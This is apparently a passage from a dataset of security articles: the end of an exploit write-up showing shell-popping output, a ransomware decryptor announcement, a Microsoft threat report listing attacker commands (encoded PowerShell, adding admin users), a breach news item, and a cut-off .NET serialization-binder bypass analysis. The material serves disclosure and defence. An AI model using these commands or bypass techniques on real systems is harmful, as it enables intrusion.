mr_me 2017 (1) bypassing authentication... (2) leaking a user session... (+) leaked session: D6D5B3A7ECE0FEF704F93249A7AD3AF6 (3) leaking the viewState... (4) writing a shell... (5) rewriting shell location... (6) executing shell... (+) starting handler on port 4444 (+) connection from 172.16.175.148 (+) pop thy shell! Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\Windows\System32>whoami whoami nt authority\system C:\Windows\System32> This is possible because many applications allow users to upload potentially malicious files (think PHP, JSP, ASP, etc) with controlled/semi-controlled content, outside of the webroot. The developer’s mindset is that, if the code is outside of the webroot, in a fixed location, there is no way for an attacker to reach it. Using a rename primitive is a powerful way to achieve code execution, because it fully side steps the developers assumptions. So all we need to do is “rename” the directory, in reality, move the directory where our backdoor is into a web accessible location. Conclusion Testing GWT from a white-box perspective is certainly easier than from a black-box. If you are testing from a white-box perspective, you can decompile the XYZService (client) and the XYZServiceImpl (server) classes and can discover all the implemented functions, their arguments and their type definitions. However, unless we can directly interact with that service, we will still need to find a way to generate the GWT serialized strings to be able to test the endpoints. Attacking GWT functions using primitive types in Java is typically easy enough, the complexity arises when the endpoint expects serialized complex types. You can download the gwt.py from the github account."
5909da8c-69df-5989-8f5e-2ab3d6e8b979,16-September-2022,Bitdefender Releases Universal LockerGoga Decryptor in Cooperation with Law Enforcement,"LockerGoga is a strain of ransomware that was identified in January 2019. It was used in attacks against several companies in the U.S. and Norway. Europol, Bitdefender and Europol have released a decryptor for the strain. The tool can help you recover your files.","We’re pleased to announce the availability of a new decryptor for LockerGoga, a strain of ransomware that rose to fame in 2019 with the attack of the Norsk Hydro company. The new decryptor is a joint effort between Bitdefender, Europol, the NoMoreRansom Project, the Zürich Public Prosecutor's Office and the Zürich Cantonal Police. LockerGoga is a family of ransomware identified in January 2019 after successful attacks against several companies in the United States of America and Norway. Its operator, who has been detained since October 2021 pending trial, is part of a larger cybercrime ring that used LockerGoga and MegaCortext ransomware to infect more than 1,800 persons and institutions in 71 countries to cause an estimated damage of $US 104 million. Indicators of a LockerGoga infection are the presence of files with a '.locked' Iextension. If you or your company have been affected by LockerGoga, you can now use the tool below to recover your files for free. We have a step-by-step tutorial on how to operate the decryptor in both single-computer and network modes. Download the LockerGoga decryptor"
7a3abf31-5308-5d2a-9aed-502ff7a298ae,25-August-2022,MERCURY leveraging Log4j 2 vulnerabilities in unpatched systems to target Israeli organizations,Microsoft detected Iran-based threat actor MERCURY leveraging exploitation of Log4j 2 vulnerabilities in SysAid applications against organizations in Israel. MSTIC assesses with high confidence that the actor is affiliated with Iran’s Ministry of Intelligence and Security.,"In recent weeks, the Microsoft Threat Intelligence Center (MSTIC) and Microsoft 365 Defender Research Team detected Iran-based threat actor MERCURY leveraging exploitation of Log4j 2 vulnerabilities in SysAid applications against organizations all located in Israel. MSTIC assesses with high confidence that MERCURY’s observed activity was affiliated with Iran’s Ministry of Intelligence and Security (MOIS). While MERCURY has used Log4j 2 exploits in the past, such as on vulnerable VMware apps, we have not seen this actor using SysAid apps as a vector for initial access until now. After gaining access, MERCURY establishes persistence, dumps credentials, and moves laterally within the targeted organization using both custom and well-known hacking tools, as well as built-in operating system tools for its hands-on-keyboard attack. This blog details Microsoft’s analysis of observed MERCURY activity and related tools used in targeted attacks. This information is shared with our customers and industry partners to improve detection of these attacks, such as implementing detections against MERCURY’s tools in both Microsoft Defender Antivirus and Microsoft Defender for Endpoint. As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information needed to secure their accounts. MERCURY TTPs align with Iran-based nation-state actor Microsoft assesses with moderate confidence that MERCURY exploited remote code execution vulnerabilities in Apache Log4j 2 (also referred to as “Log4Shell”) in vulnerable SysAid Server instances the targets were running. MERCURY has used Log4j 2 exploits in past campaigns as well. MSTIC assesses with high confidence that MERCURY is coordinating its operations in affiliation with Iran’s Ministry of Intelligence and Security (MOIS). According to the US Cyber Command , MuddyWater, a group we track as MERCURY, “is a subordinate element within the Iranian Ministry of Intelligence and Security.” The following are common MERCURY techniques and tooling: Adversary-in-the-mailbox phishing: MERCURY has a long history of spear-phishing its targets. Recently, there has been an uptick in the volume of these phishing attacks. The source of the phishing comes from compromised mailboxes and initiating previous email conversations with targets. MERCURY operators include links to or directly attach commercial remote access tools, such as ScreenConnect, in these initial phishing mails. Use of cloud file-sharing services: MERCURY utilizes commercially available file-sharing services as well as self-hosting resources for delivering payloads. Use of commercial remote access applications: The initial foothold on victims emerges via commercially available remote access applications. This allows MERCURY to gain elevated privileges and be able to transfer files, primarily PowerShell scripts, easily over to the victim’s environment. Tooling: MERCURY’s tools of choice tend to be Venom proxy tool, Ligolo reverse tunneling, and home-grown PowerShell programs. Targeting: MERCURY targets a variety of Middle Eastern-geolocated organizations. Mailbox victims correlate directly with organizations that do business with the Middle Eastern victims. This latest activity sheds light on behavior MERCURY isn’t widely known for: scanning and exploiting a vulnerable application on a target’s device. They have been observed performing this activity in the past, but it is not very common. The exploits are derived from open source and sculpted to fit their needs. Observed actor activity Initial access On July 23 and 25, 2022, MERCURY was observed using exploits against vulnerable SysAid Server instances as its initial access vector. Based on observations from past campaigns and vulnerabilities found in target environments, Microsoft assess that the exploits used were most likely related to Log4j 2. The threat actor leveraged Log4j 2 exploits against VMware applications earlier in 2022 and likely looked for similarly vulnerable internet-facing apps. SysAid, which provides IT management tools, might have presented as an attractive target for its presence in the targeted country. Figure 1. Observed MERCURY attack chain Exploiting SysAid successfully enables the threat actor to drop and leverage web shells to execute several commands, as listed below. Most commands are related to reconnaissance, with one encoded PowerShell that downloads the actor’s tool for lateral movement and persistence. Executed commands: cmd.exe /C whoami cmd.exe /C powershell -exec bypass -w 1 -enc UwB…. cmd.exe /C hostname cmd.exe /C ipconfig /all cmd.exe /C net user cmd.exe /C net localgroup administrators cmd.exe /C net user admin * /add cmd.exe /C net localgroup Administrators admin /add cmd.exe /C quser Persistence Once MERCURY has obtained access to the target organization, the threat actor establishes persistence using several methods, including: Dropping a web shell, providing effective and continued access to the compromised device. Adding a user and elevating their privileges to local administrator. Adding the leveraged tools in the startup folders and ASEP registry keys, ensuring their persistence upon device reboot. Stealing credentials. The actor leverages the new local administrator user to connect through remote desktop protocol (RDP). During this session, the threat actor dumps credentials by leveraging the open-source application Mimikatz. We also observed MERCURY later performing additional credential dumping in SQL servers to steal other high privileged accounts, like service accounts. Lateral movement We observed MERCURY further using its foothold to compromise other devices within the target organizations by leveraging several methods, such as: Windows Management Instrumentation (WMI) to launch commands on devices within organizations. Remote services (leveraging RemCom tool) to run encoded PowerShell commands within organizations. Most of the commands launched are meant to install tools on targets or perform reconnaissance to find domain administrator accounts. Communication Throughout the attack, the threat actor used different methods to communicate with their command-and-control (C2) server, including: Built-in operating system tools such as PowerShell Tunneling tool called vpnui.exe , a unique version of the open-source tool Ligolo Remote monitoring and management software called eHorus Microsoft will continue to monitor MERCURY activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. Recommended customer actions The techniques used by the actor and described in the Observed actor activity section can be mitigated by adopting the security considerations provided below: Check if you use SysAid in your network. If you do, apply security patches and update affected products and services as soon as possible. Refer to SysAid’s Important Update Regarding Apache Log4j for technical information about the vulnerabilities and mitigation recommendations. Refer to the detailed Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability . Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion. Block in-bound traffic from IPs specified in the indicators of compromise table. Review all authentication activity for remote access infrastructure, with a particular focus on accounts configured with single factor authentication, to confirm authenticity and investigate any anomalous activity. Enable multi-factor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity. Note: Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator to secure accounts. Indicators of compromise (IOCs) The below list provides IOCs observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems. Indicator Type Description hxxp://sygateway[.]com Domain First seen: May 16, 2022 91[.]121[.]240[.]104 IP address First seen: May 17, 2022 164[.]132[.]237[.]64 IP address First seen: November 26, 2021 e81a8f8ad804c4d83869d7806a303ff04f31cce376c5df8aada2e9db2c1eeb98 SHA-256 mimikatz.exe 416e937fb467b7092b9f038c1f1ea5ca831dd19ed478cca444a656b5d9440bb4 SHA-256 vpnui.exe Ligolo 25325dc4b8dcf3711e628d08854e97c49cfb904c08f6129ed1d432c6bfff576b SHA-256 VBScript 3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71 SHA-256 Remcom 3137413d086b188cd25ad5c6906fbb396554f36b41d5cff5a2176c28dd29fb0a SHA-256 Web shell 87f317bbba0f50d033543e6ebab31665a74c206780798cef277781dfdd4c3f2f SHA-256 Web shell e4ca146095414dbe44d9ba2d702fd30d27214af5a0378351109d5f91bb69cdb6 SHA-256 Web shell d2e2a0033157ff02d3668ef5cc56cb68c5540b97a359818c67bd3e37691b38c6 SHA-256 Web shell 3ca1778cd4c215f0f3bcfdd91186da116495f2d9c30ec22078eb4061ae4b5b1b SHA-256 Web shell bbfee9ef90814bf41e499d9608647a29d7451183e7fe25f472c56db9133f7e40 SHA-256 Web shell b8206d45050df5f886afefa25f384bd517d5869ca37e08eba3500cda03bddfef SHA-256 Web shell NOTE: These indicators should not be considered exhaustive for this observed activity. Microsoft Defender Threat Intelligence Community members and customers can find summary information and all IOCs from this blog post in the linked Microsoft Defender Threat Intelligence portal article . Detections Microsoft Defender Antivirus Microsoft Defender Antivirus detects attempted exploitation and post-exploitation activity and payloads. Turn on cloud-delivered protection to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block most new and unknown threats. Refer to the list of detection names related to exploitation of Log4j 2 vulnerabilities. Detections for the IOCs listed above are listed below: Backdoor:PHP/Remoteshell.V HackTool:Win32/LSADump VirTool:Win32/RemoteExec Microsoft Defender for Endpoint Microsoft Defender for Endpoint customers should monitor the alert “ Mercury Actor activity detected ” for possible presence of the indicators of compromise listed above. Reducing the attack surface Microsoft Defender for Endpoint customers can turn on the following attack surface reduction rule to block or audit some observed activity associated with this threat: Block executable files from running unless they meet a prevalence, age, or trusted list criterion. Detecting Log4j 2 exploitation Alerts that indicate threat activity related to the exploitation of the Log4j 2 exploitation should be immediately investigated and remediated. Refer to the list of Microsoft Defender for Endpoint alerts that can indicate exploitation and exploitation attempts. Detecting post-exploitation activity Alerts with the following titles may indicate post-exploitation threat activity related to MERCURY activity described in this blog and should be immediately investigated and remediated. These alerts are supported on both Windows and Linux platforms: Any alert title related to web shell threats, for example: An active ‘Remoteshell’ backdoor was blocked Any alert title that mentions PowerShell, for example: Suspicious process executed PowerShell command A malicious PowerShell Cmdlet was invoked on the machine Suspicious PowerShell command line Suspicious PowerShell download or encoded command execution Suspicious remote PowerShell execution Any alert title related to suspicious remote activity, for example: Suspicious RDP session An active ‘RemoteExec’ malware was blocked Suspicious service registration Any alert related to persistence, for example: Anomaly detected in ASEP registry User account created under suspicious circumstances Any alert title that mentions credential dumping activity or tools, for example: Malicious credential theft tool execution detected Credential dumping activity observed Mimikatz credential theft tool ‘DumpLsass’ malware was blocked on a Microsoft SQL server Microsoft Defender Vulnerability Management Microsoft 365 Defender customers can use threat and vulnerability management to identify and remediate devices that are vulnerable to Log4j 2 exploitation. A more comprehensive guidance on this capability can be found on this blog: Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability . Advanced hunting queries Microsoft Sentinel Microsoft Sentinel customers can use the following queries to look for the related malicious activity in their environments. Identify MERCURY IOCs The query below identifies matches based on IOCs shared in this post for the MERCURY actor across a range of common Microsoft Sentinel data sets: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/Mercury_Log4j_August2022.yaml Identify SysAid Server web shell creation The query below looks for potential web shell creation by SysAid Server: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/PotentialMercury_Webshell.yaml Identify MERCURY PowerShell commands The query below identifies instances of PowerShell commands used by the threat actor in command line data: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/powershell_mercury.yaml In addition to the above, Microsoft Sentinel users should also look for possible Log4j 2 vulnerabilities, the details of which were shared in a previous blog post . Microsoft 365 Defender To locate related activity, Microsoft 365 Defender customers can run the following advanced hunting queries: Potential WebShell creation by SysAisServer instance DeviceFileEvents | where InitiatingProcessFileName in~ (""java.exe"", ""javaw.exe"") | where InitiatingProcessCommandLine has ""SysAidServer"" | where FileName endswith "".jsp"" Abnormal process out of SysAidServer instance DeviceProcessEvents | where Timestamp > ago(7d) | where InitiatingProcessFileName in~ (""java.exe"", ""javaw.exe"") | where InitiatingProcessCommandLine has ""SysAidServer"" | summarize makeset(ProcessCommandLine), min(Timestamp), max(Timestamp) by DeviceId PowerShell commands used by MERCURY DeviceProcessEvents | where FileName =~ ""powershell.exe"" and ProcessCommandLine has_cs ""-exec bypass -w 1 -enc"" | where ProcessCommandLine contains_cs ""UwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAKABzAGEAcABzACAAKAAiAHAA"" | summarize makeset(ProcessCommandLine), makeset(InitiatingProcessCommandLine, 10), makeset(DeviceId), min(Timestamp), max(Timestamp) by DeviceId Vulnerable Log4j 2 devices Use this query to identify vulnerabilities in installed software on devices, surface file-level findings from the disk, and provide the ability to correlate them with additional context in advanced hunting. DeviceTvmSoftwareVulnerabilities | where CveId in (""CVE-2021-44228"", ""CVE-2021-45046"") DeviceTvmSoftwareEvidenceBeta | mv-expand DiskPaths | where DiskPaths contains ""log4j"" | project DeviceId, SoftwareName, SoftwareVendor, SoftwareVersion, DiskPaths"
c28e73f2-fd1c-52e8-b316-f1c577a4f299,20-October-2022,Medibank confirms hackers have customer data,Medibank confirms 200GB of customer data is in the hands of attackers. insurer says the data includes medical claims information and private medical information. insurer claims to have been contacted by an individual or group claiming to hold the data. the insurer said the data comes from ahm and international student systems.,"The scale of the Medibank data breach continues to worsen, with the insurer now confirming customer data, including medical claims information, is in the hands of the attackers. In a financial filing [ pdf ], Medibank said it had been contacted by an individual or group that claims to hold 200GB of data. The company said it has been shown “a sample of records for 100 policies which we believe has come from our ahm and international student systems."" “That data includes first names and surnames, addresses, dates of birth, Medicare numbers, policy numbers, phone numbers and some claims data,"" it said. The claims data includes some of peoples’ most private medical information: “where a customer received medical services, and codes relating to their diagnosis and procedures.” Medibank said the attacker also claimed to have “data related to credit card security” but that this was yet to be verified. “This morning we will commence making direct contact with the affected customers to inform them of this latest development,” the insurer said. “We expect the number of affected customers to grow as the incident continues.” “To reduce wait times for our customers, we have redeployed our people to support new cyber response hotlines in our call centres. “Medibank and ahm customers can contact us by phone (for ahm customers 13 42 46 and for Medibank customers 13 23 31) or visit the information page on the website for any updates.” Earlier today, cyber security minister Clare O’Neil said the Australian Signals Directorate and Australian Federal Police are working on the case."
02a26edf-3dd7-53d2-aae3-89f6bfe6c9d3,28-June-2022,Bypassing .NET Serialization Binders,Serialization binders are used to validate types specified in the serialized data. They are often used to prevent the deserialization of dangerous types that can allow remote code execution. In this blog post we look at two real-world examples of insecure serialization Binders in the DevExpress framework.,"Serialization binders are often used to validate types specified in the serialized data to prevent the deserialization of dangerous types that can have malicious side effects with the runtime serializers such as the BinaryFormatter . In this blog post we'll have a look into cases where this can fail and consequently may allow to bypass validation. We'll also walk though two real-world examples of insecure serialization binders in the DevExpress framework (CVE-2022-28684) and Microsoft Exchange (CVE-2022-23277), that both allow remote code execution. :root { /* https://github.com/LibreOffice/core/blob/master/extras/source/palettes/standard.soc */ --color-Black: #000000; --color-Dark-Gray-4: #111111; --color-Dark-Gray-3: #1c1c1c; --color-Dark-Gray-2: #333333; --color-Dark-Gray-1: #666666; --color-Gray: #808080; --color-Light-Gray-1: #999999; --color-Light-Gray-2: #b2b2b2; --color-Light-Gray-3: #cccccc; --color-Light-Gray-4: #dddddd; --color-Light-Gray-5: #eeeeee; --color-White: #ffffff; --color-Yellow: #ffff00; --color-Gold: #ffbf00; --color-Orange: #ff8000; --color-Brick: #ff4000; --color-Red: #ff0000; --color-Magenta: #bf0041; --color-Purple: #800080; --color-Indigo: #55308d; --color-Blue: #2a6099; --color-Teal: #158466; --color-Green: #00a933; --color-Lime: #81d41a; --color-Light-Yellow-4: #ffffd7; --color-Light-Gold-4: #fff5ce; --color-Light-Orange-4: #ffdbb6; --color-Light-Brick-4: #ffd8ce; --color-Light-Red-4: #ffd7d7; --color-Light-Magenta-4: #f7d1d5; --color-Light-Purple-4: #e0c2cd; --color-Light-Indigo-4: #dedce6; --color-Light-Blue-4: #dee6ef; --color-Light-Teal-4: #dee7e5; --color-Light-Green-4: #dde8cb; --color-Light-Lime-4: #f6f9d4; --color-Light-Yellow-3: #ffffa6; --color-Light-Gold-3: #ffe994; --color-Light-Orange-3: #ffb66c; --color-Light-Brick-3: #ffaa95; --color-Light-Red-3: #ffa6a6; --color-Light-Magenta-3: #ec9ba4; --color-Light-Purple-3: #bf819e; --color-Light-Indigo-3: #b7b3ca; --color-Light-Blue-3: #b4c7dc; --color-Light-Teal-3: #b3cac7; --color-Light-Green-3: #afd095; --color-Light-Lime-3: #e8f2a1; --color-Light-Yellow-2: #ffff6d; --color-Light-Gold-2: #ffde59; --color-Light-Orange-2: #ff972f; --color-Light-Brick-2: #ff7b59; --color-Light-Red-2: #ff6d6d; --color-Light-Magenta-2: #e16173; --color-Light-Purple-2: #a1467e; --color-Light-Indigo-2: #8e86ae; --color-Light-Blue-2: #729fcf; --color-Light-Teal-2: #81aca6; --color-Light-Green-2: #77bc65; --color-Light-Lime-2: #d4ea6b; --color-Light-Yellow-1: #ffff38; --color-Light-Gold-1: #ffd428; --color-Light-Orange-1: #ff860d; --color-Light-Brick-1: #ff5429; --color-Light-Red-1: #ff3838; --color-Light-Magenta-1: #d62e4e; --color-Light-Purple-1: #8d1d75; --color-Light-Indigo-1: #6b5e9b; --color-Light-Blue-1: #5983b0; --color-Light-Teal-1: #50938a; --color-Light-Green-1: #3faf46; --color-Light-Lime-1: #bbe33d; --color-Dark-Yellow-1: #e6e905; --color-Dark-Gold-1: #e8a202; --color-Dark-Orange-1: #ea7500; --color-Dark-Brick-1: #ed4c05; --color-Dark-Red-1: #f10d0c; --color-Dark-Magenta-1: #a7074b; --color-Dark-Purple-1: #780373; --color-Dark-Indigo-1: #5b277d; --color-Dark-Blue-1: #3465a4; --color-Dark-Teal-1: #168253; --color-Dark-Green-1: #069a2e; --color-Dark-Lime-1: #5eb91e; --color-Dark-Yellow-2: #acb20c; --color-Dark-Gold-2: #b47804; --color-Dark-Orange-2: #b85c00; --color-Dark-Brick-2: #be480a; --color-Dark-Red-2: #c9211e; --color-Dark-Magenta-2: #861141; --color-Dark-Purple-2: #650953; --color-Dark-Indigo-2: #55215b; --color-Dark-Blue-2: #355269; --color-Dark-Teal-2: #1e6a39; --color-Dark-Green-2: #127622; --color-Dark-Lime-2: #468a1a; --color-Dark-Yellow-3: #706e0c; --color-Dark-Gold-3: #784b04; --color-Dark-Orange-3: #7b3d00; --color-Dark-Brick-3: #813709; --color-Dark-Red-3: #8d281e; --color-Dark-Magenta-3: #611729; --color-Dark-Purple-3: #4e102d; --color-Dark-Indigo-3: #481d32; --color-Dark-Blue-3: #383d3c; --color-Dark-Teal-3: #28471f; --color-Dark-Green-3: #224b12; --color-Dark-Lime-3: #395511; --color-Dark-Yellow-4: #443205; --color-Dark-Gold-4: #472702; --color-Dark-Orange-4: #492300; --color-Dark-Brick-4: #4b2204; --color-Dark-Red-4: #50200c; --color-Dark-Magenta-4: #41190d; --color-Dark-Purple-4: #3b160e; --color-Dark-Indigo-4: #3a1a0f; --color-Dark-Blue-4: #362413; --color-Dark-Teal-4: #302709; --color-Dark-Green-4: #2e2706; --color-Dark-Lime-4: #342a06; } pre span { border: 0.1em solid; border-radius: 0.2em; } pre span[class] { display: inline-block; padding: 0.2em; margin: 0.1em; } pre span.aqn, pre span.typeName, pre span.assemblyName { padding: 0.2em; } pre span.genparams { display: block !important; } .aqn { background-color: var(--color-Light-Yellow-3); border-color: var(--color-Light-Yellow-2); } .typeName { background-color: var(--color-Light-Gold-3); border-color: var(--color-Light-Gold-2); } .namespace { background-color: var(--color-Light-Orange-3); border-color: var(--color-Light-Orange-2); } .type-name, .enclosing-type-name { background-color: var(--color-Light-Red-3); border-color: var(--color-Light-Red-2); } .type-params-indicator { background-color: var(--color-Light-Magenta-3); border-color: var(--color-Light-Magenta-2); } .nested-type-name { background-color: var(--color-Light-Purple-3); border-color: var(--color-Light-Purple-2); } .genparams { background-color: var(--color-Light-Indigo-3); border-color: var(--color-Light-Indigo-2); } .eaqn { background-color: var(--color-Light-Blue-3); border-color: var(--color-Light-Blue-2); } .assemblyName { background-color: var(--color-Light-Lime-3); border-color: var(--color-Light-Lime-2); } .assembly-name { background-color: var(--color-Light-Green-3); border-color: var(--color-Light-Green-2); } .assembly-attributes { background-color: var(--color-Light-Teal-3); border-color: var(--color-Light-Teal-2); } Introduction Type Names Type names are used to identify .NET types. In the fully qualified form (also known as assembly qualified name , AQN ), it also contains the information on the assembly the type should be loaded from. This information comprises of the assembly's name as well as attributes specifying its version, culture, and a token of the public key it was signed with. Here is an (extensive) example of such an assembly qualified name: System.Collections.Concurrent . ConcurrentBag `1 + ListOperation [ [ System . Object , mscorlib , Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 ] ] , System , Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 This assembly qualified name comprises of two parts with several components: Assembly Qualified Name (AQN) Type Full Name Namespace Type Name Generic Type Parameters Indicator Nested Type Name Generic Type Parameters Embedded Type AQN ( EAQN ) Assembly Full Name Assembly Name Assembly Attributes You can see that the same breakdown can also be applied to the embedded type's AQN. For simplicity, the type info will be referred to as type name and the assembly info will be referred to as assembly name as these are the general terms used by .NET and thus also within this post. The assembly and type information are used by the runtime to locate and bind the assembly . That software component is also sometimes referred to as the CLR Binder . Serialization Binders In its original intent, a SerializationBinder was supposed to work just like the runtime binder but only in the context of serialization/deserialization with the BinaryFormatter , SoapFormatter , and NetDataContractSerializer : Some users need to control which class to load, either because the class has moved between assemblies or a different version of the class is required on the server and client. — SerializationBinder Class For that, a SerializationBinder provides two methods: public virtual void BindToName(Type serializedType, out string assemblyName, out string typeName); public abstract Type BindToType(string assemblyName, string typeName); The BindToName gets called during serialization and allows to control the assemblyName and typeName values that get written to the serialized stream. On the other side, the BindToType gets called during deserialization and allows to control the Type being returned depending on the passed assemblyName and typeName that were read from the serialized stream. As the latter method is abstract , derived classes would need provide their own implementation of that method. During the time .NET deserialization issues rose in 2017, the remark "" SerializationBinder can also be used for security"" was added to the SerializationBinder documentation . Later in 2020, that remark has been changed to the exact opposite : That is probably why developers (mis-)use them as a security measure to prevent the deserialization of malicious types. And it is still widely used, even though those serializers have already been disapproved for obvious reasons. But using a SerializationBinder for validating the type to be deserialized can be tricky and has pitfalls that may allow to bypass the validation depending on how it is implemented. What could possibly go wrong? For validating the specified type, developers can either work solely on the string representations of the specified assembly name and type name, or try to resolve the specified type and then work with the returned Type . Each of these strategies has its own advantages and disadvantages. Advantages/Disadvantages of Validation Before/After Type Binding The advantage of the former is that type resolving is cost intensive and hence some advise against it to prevent a possible denial of service attacks . On the other hand, however, the type name parsing is not that straight forward and the internal type parser/binder of .NET allows some unexpected quirks: whitespace characters (i. e., U+0009, U+000A, U+000D, U+0020) are generally ignored between tokens, in some cases even further characters type names can begin with a "" . "" (period), e. g., .System.Data.DataSet assembly names are case-insensitive and can be quoted, e. g., MsCoRlIb and ""mscorlib"" assembly attribute values can be quoted, even improperly, e. g., PublicKeyToken=""b77a5c561934e089"" and PublicKeyToken='b77a5c561934e089 .NET Framework assemblies often only require the PublicKey / PublicKeyToken attribute, e. g., System.Data.DataSet, System.Data, PublicKey=00000000000000000400000000000000 or System.Data.DataSet, System.Data, PublicKeyToken=b77a5c561934e089 assembly attributes can be in arbitrary order, e. g., System.Data, PublicKeyToken=b77a5c561934e089, Culture=neutral, Version=4.0.0.0 arbitrary additional assembly attributes are allowed, e. g., System.Data, Foo=bar, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Baz=quux assembly attributes can consist of almost arbitrary data (supported escape sequences: \"" , \' , \, , \/ , \= , \\ , \n , \r , and \t ) This renders detecting known dangerous types based on their name basically impractical, which, by the way, is always a bad idea. Instead, only known safe types should be allowed and anything else should result in an exception being thrown. In contrast to that, resolving the type before validation would allow to work with a normalized form of the type. But type resolution/binding may also fail. And depending on how the custom SerializationBinder handles such cases, it can allow attackers to bypass validation. SerializationBinder Usages If you keep in mind that the SerializationBinder was supposedly never meant to be used as a security measure (otherwise it would probably have been named SerializationValidator or similar), it gets more clear if you see how it is actually used by the BinaryFormatter , SoapFormatter , and NetDataContractSerializer : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.ObjectReader.Bind(string, string) System.Runtime.Serialization.Formatters.Soap.SoapFormatter.ObjectReader.Bind(string, string) System.Runtime.Serialization.XmlObjectSerializerReadContextComplex.ResolveDataContractTypeInSharedTypeMode(string, string, out Assembly) Let's have a closer look at the first one, ObjectReader.Bind(string, string) used by BinaryFormatter : Here you can see that if the SerializationBinder.BindToType(string, string) call returns null , the fallback ObjectReader.FastBindToType(string, string) gets called. Here, if the BinaryFormatter uses FormatterAssemblyStyle.Simple (i. e., bSimpleAssembly == true , which is the default for BinaryFormatter ), then the specified assembly name is used to create an AssemblyName instance and it is then attempted to load the corresponding assembly with it. This must succeed, otherwise ObjectReader.FastBindToType(string, string) immediately returns with null . It is then tried to load the specified type with ObjectReader.GetSimplyNamedTypeFromAssembly(Assembly, string, ref Type) . This method first calls FormatterServices.GetTypeFromAssembly(Assembly, string) that tries to load the type from the already resolved assembly using Assembly.GetType(string) (not depicted here). But if that fails, it uses Type.GetType(string, Func<AssemblyName, Assembly>, Func<Assembly, string, bool, Type>, bool) with the specified type name as first parameter. Now if the specified type name happens to be a AQN, the type loading succeeds and it returns the type specified by the AQN regardless of the already loaded assembly. That means, unless the custom SerializationBinder.BindToType(string, string) implementation uses the same algorithm as the ObjectReader.FastBindToType(string, string) method, it might be possible to get the custom SerializationBinder to fail while the ObjectReader.FastBindToType(string, string) still succeeds. And if the custom SerializationBinder.BindToType(string, string) method does not throw an exception on failure but silently returns null instead, it would also allow to bypass any type validation implemented in SerializationBinder.BindToType(string, string) . This behavior already mentioned in Jonathan Birch's Dangerous Contents - Securing .Net Deserialization in 2017: Don't return null for unexpected types – this makes some serializers fall back to a default binder, allowing exploits. Origin of the Assembly Name and Type Name The assembly name and type name values passed to the SerializationBinder.BindToType(string, string) during deserialization originate from the serialized stream: the assembly name is read by BinaryAssembly.Read(__BinaryParser) and the type name by BinaryObjectWithMapTyped.Read(__BinaryParser) . On the serializing side, these values are written to the stream by BinaryAssembly.Write(__BinaryWrite) and BinaryObjectWithMapTyped.Write(__BinaryWriter) . The written values originate from an SerObjectInfoCache instance, which are set in the two available constructors: SerObjectInfoCache(string typeName, string assemblyName, bool hasTypeForwardedFrom) SerObjectInfoCache(Type type) In the latter case, the assembly name and type name are obtained from the TypeInformation returned by BinaryFormatter.GetTypeInformation(Type) . In the former case, however, the assembly name and type name are adopted from the SerializationInfo instance filled during serialization if the assembly name or type name was set explicitly via SerializationInfo.AssemblyName and SerializationInfo.FullTypeName , respectively. That means, besides using SerializationInfo.SetType(Type) , it is also possible to set the assembly name and type name explicitly and independently as strings by using SerializationInfo.AssemblyName and SerializationInfo.FullTypeName : [Serializable] class Marshal : ISerializable { public void GetObjectData(SerializationInfo info, StreamingContext context) { info.AssemblyName = ""…""; info.FullTypeName = ""…""; } } There is also another and probably more convenient way to specify an arbitrary assembly name and type name by using a custom SerializationBinder during serialization: class CustomSerializationBinder : SerializationBinder { public override void BindToName(Type serializedType, out string assemblyName, out string typeName) { assemblyName = ""…""; typeName = ""…""; } public override Type BindToType(string assemblyName, string typeName) { throw new NotImplementedException(); } } This allows to fiddle with all assembly names and type names that are used within the object graph to be serialized. Common Pitfalls of Custom SerializationBinder s There are two common pitfalls that can render a SerializationBinder bypassable: parsing the passed assembly name and type name differently than the .NET runtime does resolving the specified type differently than the .NET runtime does We will demonstrate these with two case studies: the DevExpress framework (CVE-2022-28684) and Microsoft Exchange (CVE-2022-23277). Case Study № 1: SafeSerializationBinder in DevExpress (CVE-2022-28684) Despite its name, the DevExpress.Data.Internal.SafeSerializationBinder class of DevExpress.Data is not really a SerializationBinder . But its Ensure(string, string) method is used by the DXSerializationBinder.BindToType(string, string) method to check for safe and unsafe types. It does this by checking the assembly name and type name against a list of known unsafe types (i. e., UnsafeTypes class) and known safe types (i. e., KnownTypes class). To pass the validation, the former must not match while the latter must match as both XtraSerializationSecurityTrace.UnsafeType(string, string) and XtraSerializationSecurityTrace.NotTrustedType(string, string) result in an exception being thrown. The check in each Match(string, string) method comprises of a match against so called type ranges and several full type names. A type range is basically a pair of assembly name and namespace prefix that the passed assembly name and type name are tested against. Here is the definition of UnsafeTypes.typeRanges that UnsafeTypes.Match(string, string) tests against: And here UnsafeTypes.types : This set basically comprises the types used in public gadgets such as those of YSoSerial.Net . Remember that SafeSerializationBinder.Ensure(string, string) does not resolve the specified type but only works on the assembly names and type names read from the serialized stream. The type binding/resolution attempt happens after the string-based validation in DXSerializationBinder.BindToType(string, string) where Assembly.GetType(string, bool) is used to load the specified type from the specified assembly but without throwing an exception on error (i. e., the passed false ). We'll demonstrate how a System.Data.DataSet can be used to bypass validation in SafeSerializationBinder.Ensure(string, string) despite it is contained in UnsafeTypes.types . As DXSerializationBinder.BindToType(string, string) can return null in two cases ( assembly == null or Assembly.GetType(string, bool) returns null ), 